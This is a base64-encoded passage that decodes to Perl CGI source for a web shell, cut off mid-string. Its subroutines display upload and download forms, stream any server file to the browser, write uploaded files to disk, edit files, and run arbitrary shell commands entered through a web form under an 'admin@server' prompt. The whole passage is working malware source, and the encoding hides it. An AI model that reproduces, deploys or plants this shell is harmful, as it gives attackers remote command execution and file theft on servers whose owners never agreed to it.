LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBIVE1MIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVzZXIgdG8gZG93bmxvYWQgZmlsZXMNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludEZpbGVEb3dubG9hZEZvcm0NCnsNCglteSAkZGlyID0gJkFkZExpbmtEaXIoImRvd25sb2FkIik7IA0KCSRQcm9tcHQgPSAkV2luTlQgPyAiJGRpciA+ICIgOiAiW2FkbWluXEAkU2VydmVyTmFtZSAkZGlyXVwkICI7DQoJcmV0dXJuIDw8RU5EOw0KPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImRvd25sb2FkIj4NCiRQcm9tcHQgZG93bmxvYWQ8YnI+PGJyPg0KRmlsZW5hbWU6IDxpbnB1dCBjbGFzcz0iZmlsZSIgdHlwZT0idGV4dCIgbmFtZT0iZiIgc2l6ZT0iMzUiPjxicj48YnI+DQpEb3dubG9hZDogPGlucHV0IGNsYXNzPSJzdWJtaXQiIHR5cGU9InN1Ym1pdCIgdmFsdWU9IkJlZ2luIj4NCg0KPC9mb3JtPg0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBIVE1MIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVzZXIgdG8gdXBsb2FkIGZpbGVzDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRGaWxlVXBsb2FkRm9ybQ0Kew0KCW15ICRkaXI9ICZBZGRMaW5rRGlyKCJ1cGxvYWQiKTsNCgkkUHJvbXB0ID0gJFdpbk5UID8gIiRkaXIgPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJGRpcl1cJCAiOw0KCXJldHVybiA8PEVORDsNCjxmb3JtIG5hbWU9ImYiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KJFByb21wdCB1cGxvYWQ8YnI+PGJyPg0KRmlsZW5hbWU6IDxpbnB1dCBjbGFzcz0iZmlsZSIgdHlwZT0iZmlsZSIgbmFtZT0iZiIgc2l6ZT0iMzUiPjxicj48YnI+DQpPcHRpb25zOiAmbmJzcDs8aW5wdXQgdHlwZT0iY2hlY2tib3giIG5hbWU9Im8iIGlkPSJ1cCIgdmFsdWU9Im92ZXJ3cml0ZSI+DQo8bGFiZWwgZm9yPSJ1cCI+T3ZlcndyaXRlIGlmIGl0IEV4aXN0czwvbGFiZWw+PGJyPjxicj4NClVwbG9hZDombmJzcDsmbmJzcDsmbmJzcDs8aW5wdXQgY2xhc3M9InN1Ym1pdCIgdHlwZT0ic3VibWl0IiB2YWx1ZT0iQmVnaW4iPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZCIgdmFsdWU9IiRDdXJyZW50RGlyIj4NCjxpbnB1dCBjbGFzcz0ic3VibWl0IiB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJ1cGxvYWQiPg0KDQo8L2Zvcm0+DQoNCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHRpbWVvdXQgZm9yIGEgY29tbWFuZCBleHBpcmVzLiBXZSBuZWVkIHRvDQojIHRlcm1pbmF0ZSB0aGUgc2NyaXB0IGltbWVkaWF0ZWx5LiBUaGlzIGZ1bmN0aW9uIGlzIHZhbGlkIG9ubHkgb24gVW5peC4gSXQgaXMNCiMgbmV2ZXIgY2FsbGVkIHdoZW4gdGhlIHNjcmlwdCBpcyBydW5uaW5nIG9uIE5ULg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIENvbW1hbmRUaW1lb3V0DQp7DQoJaWYoISRXaW5OVCkNCgl7DQoJCWFsYXJtKDApOw0KCQlyZXR1cm4gPDxFTkQ7DQo8L3RleHRhcmVhPg0KPGJyPjxmb250IGNvbG9yPXllbGxvdz4NCkNvbW1hbmQgZXhjZWVkZWQgbWF4aW11bSB0aW1lIG9mICRDb21tYW5kVGltZW91dER1cmF0aW9uIHNlY29uZChzKS48L2ZvbnQ+DQo8YnI+PGZvbnQgc2l6ZT0nNicgY29sb3I9cmVkPktpbGxlZCBpdCE8L2ZvbnQ+DQpFTkQNCgl9DQp9DQoNCg0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gZGlzcGxheXMgdGhlIHBhZ2UgdGhhdCBjb250YWlucyBhIGxpbmsgd2hpY2ggYWxsb3dzIHRoZSB1c2VyDQojIHRvIGRvd25sb2FkIHRoZSBzcGVjaWZpZWQgZmlsZS4gVGhlIHBhZ2UgYWxzbyBjb250YWlucyBhIGF1dG8tcmVmcmVzaA0KIyBmZWF0dXJlIHRoYXQgc3RhcnRzIHRoZSBkb3dubG9hZCBhdXRvbWF0aWNhbGx5Lg0KIyBBcmd1bWVudCAxOiBGdWxseSBxdWFsaWZpZWQgZmlsZW5hbWUgb2YgdGhlIGZpbGUgdG8gYmUgZG93bmxvYWRlZA0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50RG93bmxvYWRMaW5rUGFnZQ0Kew0KCWxvY2FsKCRGaWxlVXJsKSA9IEBfOw0KCW15ICRyZXN1bHQ9IiI7DQoJaWYoLWUgJEZpbGVVcmwpICMgaWYgdGhlIGZpbGUgZXhpc3RzDQoJew0KCQkjIGVuY29kZSB0aGUgZmlsZSBsaW5rIHNvIHdlIGNhbiBzZW5kIGl0IHRvIHRoZSBicm93c2VyDQoJCSRGaWxlVXJsID1+IHMvKFteYS16QS1aMC05XSkvJyUnLnVucGFjaygiSCoiLCQxKS9lZzsNCgkJJERvd25sb2FkTGluayA9ICIkU2NyaXB0TG9jYXRpb24/YT1kb3dubG9hZCZmPSRGaWxlVXJsJm89Z28iOw0KCQkkSHRtbE1ldGFIZWFkZXIgPSAiPG1ldGEgSFRUUC1FUVVJVj1cIlJlZnJlc2hcIiBDT05URU5UPVwiMTsgVVJMPSREb3dubG9hZExpbmtcIj4iOw0KCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7DQoJCSRyZXN1bHQgLj0gPDxFTkQ7DQpTZW5kaW5nIEZpbGUgJFRyYW5zZmVyRmlsZS4uLjxicj4NCg0KSWYgdGhlIGRvd25sb2FkIGRvZXMgbm90IHN0YXJ0IGF1dG9tYXRpY2FsbHksDQo8YSBocmVmPSIkRG93bmxvYWRMaW5rIj5DbGljayBIZXJlPC9hPg0KRU5EDQoJCSRyZXN1bHQgLj0gJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07DQoJfQ0KCWVsc2UgIyBmaWxlIGRvZXNuJ3QgZXhpc3QNCgl7DQoJCSRyZXN1bHQgLj0gIkZhaWxlZCB0byBkb3dubG9hZCAkRmlsZVVybDogJCEiOw0KCQkkcmVzdWx0IC49ICZQcmludEZpbGVEb3dubG9hZEZvcm07DQoJfQ0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gcmVhZHMgdGhlIHNwZWNpZmllZCBmaWxlIGZyb20gdGhlIGRpc2sgYW5kIHNlbmRzIGl0IHRvIHRoZQ0KIyBicm93c2VyLCBzbyB0aGF0IGl0IGNhbiBiZSBkb3dubG9hZGVkIGJ5IHRoZSB1c2VyLg0KIyBBcmd1bWVudCAxOiBGdWxseSBxdWFsaWZpZWQgcGF0aG5hbWUgb2YgdGhlIGZpbGUgdG8gYmUgc2VudC4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBTZW5kRmlsZVRvQnJvd3Nlcg0Kew0KCW15ICRyZXN1bHQgPSAiIjsNCglsb2NhbCgkU2VuZEZpbGUpID0gQF87DQoJaWYob3BlbihTRU5ERklMRSwgJFNlbmRGaWxlKSkgIyBmaWxlIG9wZW5lZCBmb3IgcmVhZGluZw0KCXsNCgkJaWYoJFdpbk5UKQ0KCQl7DQoJCQliaW5tb2RlKFNFTkRGSUxFKTsNCgkJCWJpbm1vZGUoU1RET1VUKTsNCgkJfQ0KCQkkRmlsZVNpemUgPSAoc3RhdCgkU2VuZEZpbGUpKVs3XTsNCgkJKCRGaWxlbmFtZSA9ICRTZW5kRmlsZSkgPX4gIG0hKFteL15cXF0qKSQhOw0KCQlwcmludCAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXVua25vd25cbiI7DQoJCXByaW50ICJDb250ZW50LUxlbmd0aDogJEZpbGVTaXplXG4iOw0KCQlwcmludCAiQ29udGVudC1EaXNwb3NpdGlvbjogYXR0YWNobWVudDsgZmlsZW5hbWU9JDFcblxuIjsNCgkJcHJpbnQgd2hpbGUoPFNFTkRGSUxFPik7DQoJCWNsb3NlKFNFTkRGSUxFKTsNCgkJZXhpdCgxKTsNCgl9DQoJZWxzZSAjIGZhaWxlZCB0byBvcGVuIGZpbGUNCgl7DQoJCSRyZXN1bHQgLj0gIkZhaWxlZCB0byBkb3dubG9hZCAkU2VuZEZpbGU6ICQhIjsNCgkJJHJlc3VsdCAuPSZQcmludEZpbGVEb3dubG9hZEZvcm07DQoJfQ0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KDQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdXNlciBkb3dubG9hZHMgYSBmaWxlLiBJdCBkaXNwbGF5cyBhIG1lc3NhZ2UNCiMgdG8gdGhlIHVzZXIgYW5kIHByb3ZpZGVzIGEgbGluayB0aHJvdWdoIHdoaWNoIHRoZSBmaWxlIGNhbiBiZSBkb3dubG9hZGVkLg0KIyBUaGlzIGZ1bmN0aW9uIGlzIGFsc28gY2FsbGVkIHdoZW4gdGhlIHVzZXIgY2xpY2tzIG9uIHRoYXQgbGluay4gSW4gdGhpcyBjYXNlLA0KIyB0aGUgZmlsZSBpcyByZWFkIGFuZCBzZW50IHRvIHRoZSBicm93c2VyLg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIEJlZ2luRG93bmxvYWQNCnsNCgkjIGdldCBmdWxseSBxdWFsaWZpZWQgcGF0aCBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkDQoJaWYoKCRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlxcfF4uOi8pKSB8DQoJCSghJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXC8vKSkpICMgcGF0aCBpcyBhYnNvbHV0ZQ0KCXsNCgkJJFRhcmdldEZpbGUgPSAkVHJhbnNmZXJGaWxlOw0KCX0NCgllbHNlICMgcGF0aCBpcyByZWxhdGl2ZQ0KCXsNCgkJY2hvcCgkVGFyZ2V0RmlsZSkgaWYoJFRhcmdldEZpbGUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kLzsNCgkJJFRhcmdldEZpbGUgLj0gJFBhdGhTZXAuJFRyYW5zZmVyRmlsZTsNCgl9DQoNCglpZigkT3B0aW9ucyBlcSAiZ28iKSAjIHdlIGhhdmUgdG8gc2VuZCB0aGUgZmlsZQ0KCXsNCgkJJlNlbmRGaWxlVG9Ccm93c2VyKCRUYXJnZXRGaWxlKTsNCgl9DQoJZWxzZSAjIHdlIGhhdmUgdG8gc2VuZCBvbmx5IHRoZSBsaW5rIHBhZ2UNCgl7DQoJCSZQcmludERvd25sb2FkTGlua1BhZ2UoJFRhcmdldEZpbGUpOw0KCX0NCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB3aGVuIHRoZSB1c2VyIHdhbnRzIHRvIHVwbG9hZCBhIGZpbGUuIElmIHRoZQ0KIyBmaWxlIGlzIG5vdCBzcGVjaWZpZWQsIGl0IGRpc3BsYXlzIGEgZm9ybSBhbGxvd2luZyB0aGUgdXNlciB0byBzcGVjaWZ5IGENCiMgZmlsZSwgb3RoZXJ3aXNlIGl0IHN0YXJ0cyB0aGUgdXBsb2FkIHByb2Nlc3MuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgVXBsb2FkRmlsZQ0Kew0KCSMgaWYgbm8gZmlsZSBpcyBzcGVjaWZpZWQsIHByaW50IHRoZSB1cGxvYWQgZm9ybSBhZ2Fpbg0KCWlmKCRUcmFuc2ZlckZpbGUgZXEgIiIpDQoJew0KCQlyZXR1cm4gJlByaW50RmlsZVVwbG9hZEZvcm07DQoNCgl9DQoJbXkgJHJlc3VsdD0iIjsNCgkjIHN0YXJ0IHRoZSB1cGxvYWRpbmcgcHJvY2Vzcw0KCSRyZXN1bHQgLj0gIlVwbG9hZGluZyAkVHJhbnNmZXJGaWxlIHRvICRDdXJyZW50RGlyLi4uPGJyPiI7DQoNCgkjIGdldCB0aGUgZnVsbGx5IHF1YWxpZmllZCBwYXRobmFtZSBvZiB0aGUgZmlsZSB0byBiZSBjcmVhdGVkDQoJY2hvcCgkVGFyZ2V0TmFtZSkgaWYgKCRUYXJnZXROYW1lID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87DQoJJFRyYW5zZmVyRmlsZSA9fiBtIShbXi9eXFxdKikkITsNCgkkVGFyZ2V0TmFtZSAuPSAkUGF0aFNlcC4kMTsNCg0KCSRUYXJnZXRGaWxlU2l6ZSA9IGxlbmd0aCgkaW57J2ZpbGVkYXRhJ30pOw0KCSMgaWYgdGhlIGZpbGUgZXhpc3RzIGFuZCB3ZSBhcmUgbm90IHN1cHBvc2VkIHRvIG92ZXJ3cml0ZSBpdA0KCWlmKC1lICRUYXJnZXROYW1lICYmICRPcHRpb25zIG5lICJvdmVyd3JpdGUiKQ0KCXsNCgkJJHJlc3VsdCAuPSAiRmFpbGVkOiBEZXN0aW5hdGlvbiBmaWxlIGFscmVhZHkgZXhpc3RzLjxicj4iOw0KCX0NCgllbHNlICMgZmlsZSBpcyBub3QgcHJlc2VudA0KCXsNCgkJaWYob3BlbihVUExPQURGSUxFLCAiPiRUYXJnZXROYW1lIikpDQoJCXsNCgkJCWJpbm1vZGUoVVBMT0FERklMRSkgaWYgJFdpbk5UOw0KCQkJcHJpbnQgVVBMT0FERklMRSAkaW57J2ZpbGVkYXRhJ307DQoJCQljbG9zZShVUExPQURGSUxFKTsNCgkJCSRyZXN1bHQgLj0gIlRyYW5zZmVyZWQgJFRhcmdldEZpbGVTaXplIEJ5dGVzLjxicj4iOw0KCQkJJHJlc3VsdCAuPSAiRmlsZSBQYXRoOiAkVGFyZ2V0TmFtZTxicj4iOw0KCQl9DQoJCWVsc2UNCgkJew0KCQkJJHJlc3VsdCAuPSAiRmFpbGVkOiAkITxicj4iOw0KCQl9DQoJfQ0KCSRyZXN1bHQgLj0gJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdXNlciB3YW50cyB0byBkb3dubG9hZCBhIGZpbGUuIElmIHRoZQ0KIyBmaWxlbmFtZSBpcyBub3Qgc3BlY2lmaWVkLCBpdCBkaXNwbGF5cyBhIGZvcm0gYWxsb3dpbmcgdGhlIHVzZXIgdG8gc3BlY2lmeSBhDQojIGZpbGUsIG90aGVyd2lzZSBpdCBkaXNwbGF5cyBhIG1lc3NhZ2UgdG8gdGhlIHVzZXIgYW5kIHByb3ZpZGVzIGEgbGluaw0KIyB0aHJvdWdoICB3aGljaCB0aGUgZmlsZSBjYW4gYmUgZG93bmxvYWRlZC4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBEb3dubG9hZEZpbGUNCnsNCgkjIGlmIG5vIGZpbGUgaXMgc3BlY2lmaWVkLCBwcmludCB0aGUgZG93bmxvYWQgZm9ybSBhZ2Fpbg0KCWlmKCRUcmFuc2ZlckZpbGUgZXEgIiIpDQoJew0KCQkmUHJpbnRQYWdlSGVhZGVyKCJmIik7DQoJCXJldHVybiAmUHJpbnRGaWxlRG93bmxvYWRGb3JtOw0KCX0NCgkNCgkjIGdldCBmdWxseSBxdWFsaWZpZWQgcGF0aCBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkDQoJaWYoKCRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlxcfF4uOi8pKSB8ICghJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXC8vKSkpICMgcGF0aCBpcyBhYnNvbHV0ZQ0KCXsNCgkJJFRhcmdldEZpbGUgPSAkVHJhbnNmZXJGaWxlOw0KCX0NCgllbHNlICMgcGF0aCBpcyByZWxhdGl2ZQ0KCXsNCgkJY2hvcCgkVGFyZ2V0RmlsZSkgaWYoJFRhcmdldEZpbGUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kLzsNCgkJJFRhcmdldEZpbGUgLj0gJFBhdGhTZXAuJFRyYW5zZmVyRmlsZTsNCgl9DQoNCglpZigkT3B0aW9ucyBlcSAiZ28iKSAjIHdlIGhhdmUgdG8gc2VuZCB0aGUgZmlsZQ0KCXsNCgkJcmV0dXJuICZTZW5kRmlsZVRvQnJvd3NlcigkVGFyZ2V0RmlsZSk7DQoJfQ0KCWVsc2UgIyB3ZSBoYXZlIHRvIHNlbmQgb25seSB0aGUgbGluayBwYWdlDQoJew0KCQlyZXR1cm4gJlByaW50RG93bmxvYWRMaW5rUGFnZSgkVGFyZ2V0RmlsZSk7DQoJfQ0KfQ0KDQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgdG8gZXhlY3V0ZSBjb21tYW5kcy4gSXQgZGlzcGxheXMgdGhlIG91dHB1dCBvZiB0aGUNCiMgY29tbWFuZCBhbmQgYWxsb3dzIHRoZSB1c2VyIHRvIGVudGVyIGFub3RoZXIgY29tbWFuZC4gVGhlIGNoYW5nZSBkaXJlY3RvcnkNCiMgY29tbWFuZCBpcyBoYW5kbGVkIGRpZmZlcmVudGx5LiBJbiB0aGlzIGNhc2UsIHRoZSBuZXcgZGlyZWN0b3J5IGlzIHN0b3JlZCBpbg0KIyBhbiBpbnRlcm5hbCB2YXJpYWJsZSBhbmQgaXMgdXNlZCBlYWNoIHRpbWUgYSBjb21tYW5kIGhhcyB0byBiZSBleGVjdXRlZC4gVGhlDQojIG91dHB1dCBvZiB0aGUgY2hhbmdlIGRpcmVjdG9yeSBjb21tYW5kIGlzIG5vdCBkaXNwbGF5ZWQgdG8gdGhlIHVzZXJzDQojIHRoZXJlZm9yZSBlcnJvciBtZXNzYWdlcyBjYW5ub3QgYmUgZGlzcGxheWVkLg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIEV4ZWN1dGVDb21tYW5kDQp7DQoJbXkgJHJlc3VsdD0iIjsNCglpZigkUnVuQ29tbWFuZCA9fiBtL15ccypjZFxzKyguKykvKSAjIGl0IGlzIGEgY2hhbmdlIGRpciBjb21tYW5kDQoJew0KCQkjIHdlIGNoYW5nZSB0aGUgZGlyZWN0b3J5IGludGVybmFsbHkuIFRoZSBvdXRwdXQgb2YgdGhlDQoJCSMgY29tbWFuZCBpcyBub3QgZGlzcGxheWVkLg0KCQkkQ29tbWFuZCA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuImNkICQxIi4kQ21kU2VwLiRDbWRQd2Q7DQoJCWNob3AoJEN1cnJlbnREaXIgPSBgJENvbW1hbmRgKTsNCgkJJHJlc3VsdCAuPSAmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCg0KCQkkcmVzdWx0IC49ICJDb21tYW5kOiA8cnVuPiRSdW5Db21tYW5kIDwvcnVuPjxicj48dGV4dGFyZWEgY29scz0nJGNvbHMnIHJvd3M9JyRyb3dzJyBzcGVsbGNoZWNrPSdmYWxzZSc+IjsNCgkJIyB4dWF0IHRob25nIHRpbiBraGkgY2h1eWVuIGRlbiAxIHRodSBtdWMgbmFvIGRvIQ0KCQkkUnVuQ29tbWFuZD0gJFdpbk5UPyJkaXIiOiJkaXIgLWxpYSI7DQoJCSRyZXN1bHQgLj0gJlJ1bkNtZDsNCgl9ZWxzaWYoJFJ1bkNvbW1hbmQgPX4gbS9eXHMqZWRpdFxzKyguKykvKQ0KCXsNCgkJJHJlc3VsdCAuPSAgJlNhdmVGaWxlRm9ybTsNCgl9ZWxzZQ0KCXsNCgkJJHJlc3VsdCAuPSAmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCgkJJHJlc3VsdCAuPSAiQ29tbWFuZDogPHJ1bj4kUnVuQ29tbWFuZDwvcnVuPjxicj48dGV4dGFyZWEgaWQ9J2RhdGEnIGNvbHM9JyRjb2xzJyByb3dzPSckcm93cycgc3BlbGxjaGVjaz0nZmFsc2UnPiI7DQoJCSRyZXN1bHQgLj0mUnVuQ21kOw0KCX0NCgkkcmVzdWx0IC49ICAiPC90ZXh0YXJlYT4iOw0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIHJ1biBjb21tYW5kDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoNCnN1YiBSdW5DbWQNCnsNCglteSAkcmVzdWx0PSIiOw0KCSRDb21tYW5kID0gImNkIFwiJEN1cnJlbnREaXJcIiIuJENtZFNlcC4kUnVuQ29tbWFuZC4kUmVkaXJlY3RvcjsNCglpZighJFdpbk5UKQ0KCXsNCgkJJFNJR3snQUxSTSd9ID0gXCZDb21tYW5kVGltZW91dDsNCgkJYWxhcm0oJENvbW1hbmRUaW1lb3V0RHVyYXRpb24pOw0KCX0NCglpZigkU2hvd0R5bmFtaWNPdXRwdXQpICMgc2hvdyBvdXRwdXQgYXMgaXQgaXMgZ2VuZXJhdGVkDQoJew0KCQkkfD0xOw0KCQkkQ29tbWFuZCAuPSAiIHwiOw0KCQlvcGVuKENvbW1hbmRPdXRwdXQsICRDb21tYW5kKTsNCgkJd2hpbGUoPENvbW1hbmRPdXRwdXQ+KQ0KCQl7DQoJCQkkXyA9fiBzLyhcbnxcclxuKSQvLzsNCgkJCSRyZXN1bHQgLj0gJkh0bWxTcGVjaWFsQ2hhcnMoIiRfXG4iKTsNCgkJfQ0KCQkkfD0wOw0KCX0NCgllbHNlICMgc2hvdyBvdXRwdXQgYWZ0ZXIgY29tbWFuZCBjb21wbGV0ZXMNCgl7DQoJCSRyZXN1bHQgLj0gJkh0bWxTcGVjaWFsQ2hhcnMoJyRDb21tYW5kJyk7DQoJfQ0KCWlmKCEkV2luTlQpDQoJew0KCQlhbGFybSgwKTsNCgl9DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQojPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQojIEZvcm0gU2F2ZSBGaWxlIA0KIz09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0Kc3ViIFNhdmVGaWxlRm9ybQ0Kew0KCW15ICRyZXN1bHQgPSIiOw0KCXN1YnN0cigkUnVuQ29tbWFuZCwwLDUpPSIiOw0KCW15ICRmaWxlPSZ0cmltKCRSdW5Db21tYW5kKTsNCgkkc2F2ZT0nPGJyPjxpbnB1dCBuYW1lPSJhIiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJzYXZlIiBjbGFzcz0ic3VibWl0IiA+JzsNCgkkRmlsZT0kQ3VycmVudERpci4kUGF0aFNlcC4kUnVuQ29tbWFuZDsNCglteSAkZGlyPSI8c3BhbiBzdHlsZT0nZm9udDogMTFwdCBWZXJkYW5hOyBmb250LXdlaWdodDogYm9sZDsnPiIuJkFkZExpbmtEaXIoImd1aSIpLiI8L3NwYW4+IjsNCglpZigtdyAkRmlsZSkNCgl7DQoJCSRyb3dzPSIyMyINCgl9ZWxzZQ0KCXsNCgkJJG1zZz0iPGJyPjxmb250IHN0eWxlPSdmb250OiAxNXB0IFZlcmRhbmE7IGNvbG9yOiB5ZWxsb3c7JyA+IFBlcm1pc3Npb24gZGVuaWVkITxmb250Pjxicj4iOw0KCQkkcm93cz0iMjAiDQoJfQ0KCSRQcm9tcHQgPSAkV2luTlQgPyAiJGRpciA+ICIgOiAiPGZvbnQgY29sb3I9JyNGRkZGRkYnPlthZG1pblxAJFNlcnZlck5hbWUgJGRpcl1cJDwvZm9udD4gIjsNCgkkcmVhZD0oJFdpbk5UKT8idHlwZSI6Imxlc3MiOw0KCSRSdW5Db21tYW5kID0gIiRyZWFkIFwiJFJ1bkNvbW1hbmRcIiI7DQoJJHJlc3VsdCAuPSAgPDxFTkQ7DQoJPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+DQoNCgk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPg0KCSRQcm9tcHQNCgk8aW5wdXQgdHlwZT0idGV4dCIgc2l6ZT0iNDAiIG5hbWU9ImMiPg0KCTxpbnB1dCBuYW1lPSJzIiBjbGFzcz0ic3VibWl0IiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJFbnRlciI+DQoJPGJyPkNvbW1hbmQ6IDxydW4+ICRSdW5Db21tYW5kIDwvcnVuPg0KCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImZpbGUiIHZhbHVlPSIkZmlsZSIgPiAkc2F2ZSA8YnI+ICRtc2cNCgk8YnI+PHRleHRhcmVhIGlkPSJkYXRhIiBuYW1lPSJkYXRhIiBjb2xzPSIkY29scyIgcm93cz0iJHJvd3MiIHNwZWxsY2hlY2s9ImZhbHNlIj4NCkVORA0KCQ0KCSRyZXN1bHQgLj0gJlJ1bkNtZDsNCgkkcmVzdWx0IC49ICAiPC90ZXh0